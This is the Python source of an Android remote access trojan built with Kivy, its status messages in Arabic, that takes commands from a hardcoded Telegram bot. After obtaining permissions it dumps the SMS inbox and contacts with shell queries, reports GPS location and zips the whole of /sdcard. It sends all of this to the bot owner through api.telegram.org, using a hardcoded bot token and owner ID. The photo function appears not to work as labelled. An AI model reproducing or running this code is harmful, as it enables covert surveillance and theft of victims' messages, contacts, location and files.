# telegram_rat.py

import os
import time
import shutil
import requests
from threading import Thread
from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
from kivy.clock import Clock
from android.permissions import request_permissions, Permission
from plyer import gps

BOT_TOKEN = "7923889994:AAF3IY_Omz3uNwyTgsxLm-iaPFvPP5pMPb8"
OWNER_ID = "5218031067"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"

ALLOWED_COMMANDS = ["get_sms", "get_contacts", "get_location", "take_photo", "get_files"]

class RemoteControlApp(App):
    def build(self):
        self.layout = BoxLayout(orientation='vertical')
        self.label = Label(text="📡 جاري طلب الصلاحيات...", halign="center")
        self.layout.add_widget(self.label)
        request_permissions([
            Permission.READ_SMS,
            Permission.READ_CONTACTS,
            Permission.ACCESS_FINE_LOCATION,
            Permission.CAMERA,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE
        ], self.on_permissions_granted)
        return self.layout

    def on_permissions_granted(self, permissions, results):
        if all(results):
            self.label.text = "✅ تم منح جميع الصلاحيات، جاري الاتصال..."
            self.last_update_id = 0
            Clock.schedule_interval(lambda dt: self.check_messages(), 10)
        else:
            self.label.text = "❌ يجب منح جميع الصلاحيات لتشغيل التطبيق"

    def check_messages(self):
        try:
            updates = requests.get(API_URL + f"getUpdates?offset={self.last_update_id + 1}&timeout=10").json()
            if not updates["ok"]:
                return
            for update in updates["result"]:
                self.last_update_id = update["update_id"]
                if "message" in update:
                    message = update["message"]
                    chat_id = message["chat"].get("id")
                    text = message.get("text")
                    if chat_id == int(OWNER_ID) and text:
                        self.handle_command(text.strip())
        except Exception as e:
            self.label.text = f"❌ خطأ الاتصال: {str(e)}"

    def handle_command(self, command):
        if command == "get_sms":
            self.get_sms()
        elif command == "get_contacts":
            self.get_contacts()
        elif command == "get_location":
            self.get_location()
        elif command == "take_photo":
            self.take_photo()
        elif command == "get_files":
            self.get_files()
        else:
            self.send_message("⚠️ أمر غير معروف")

    def send_message(self, text):
        try:
            requests.post(API_URL + "sendMessage", data={"chat_id": OWNER_ID, "text": text})
        except:
            pass

    def send_file(self, filepath):
        try:
            with open(filepath, 'rb') as f:
                requests.post(API_URL + "sendDocument", files={'document': f}, data={'chat_id': OWNER_ID})
        except:
            self.send_message("❌ فشل إرسال الملف")

    def get_sms(self):
        try:
            path = "/sdcard/sms_dump.txt"
            os.system(f"content query --uri content://sms/inbox > {path}")
            self.send_file(path)
            self.send_message("✅ تم استخراج الرسائل")
        except Exception as e:
            self.send_message(f"❌ فشل قراءة SMS: {e}")

    def get_contacts(self):
        try:
            path = "/sdcard/contacts_dump.txt"
            os.system(f"content query --uri content://contacts/phones/ > {path}")
            self.send_file(path)
            self.send_message("✅ تم استخراج جهات الاتصال")
        except Exception as e:
            self.send_message(f"❌ فشل قراءة Contacts: {e}")

    def get_location(self):
        def _get_loc():
            try:
                gps.configure(on_location=self.on_gps)
                gps.start()
                time.sleep(10)
                gps.stop()
            except Exception as e:
                self.send_message(f"❌ GPS غير متوفر: {e}")

        Thread(target=_get_loc).start()

    def on_gps(self, **kwargs):
        lat = kwargs.get('lat')
        lon = kwargs.get('lon')
        self.send_message(f"📍 الموقع: {lat}, {lon}")

    def take_photo(self):
        try:
            path = "/sdcard/capture.jpg"
            os.system(f"content insert --uri content://media/external/images/media --bind name:s:'capture.jpg' --bind data:s:'{path}'")
            self.send_file(path)
            self.send_message("✅ تم التقاط صورة (إذا نجح)")
        except Exception as e:
            self.send_message(f"❌ فشل الكاميرا: {e}")

    def get_files(self):
        try:
            path = "/sdcard/files_dump.zip"
            shutil.make_archive("/sdcard/files_dump", 'zip', "/sdcard/")
            self.send_file(path)
            self.send_message("✅ تم ضغط وإرسال الملفات")
        except Exception as e:
            self.send_message(f"❌ فشل الملفات: {e}")

if __name__ == '__main__':
    RemoteControlApp().run()
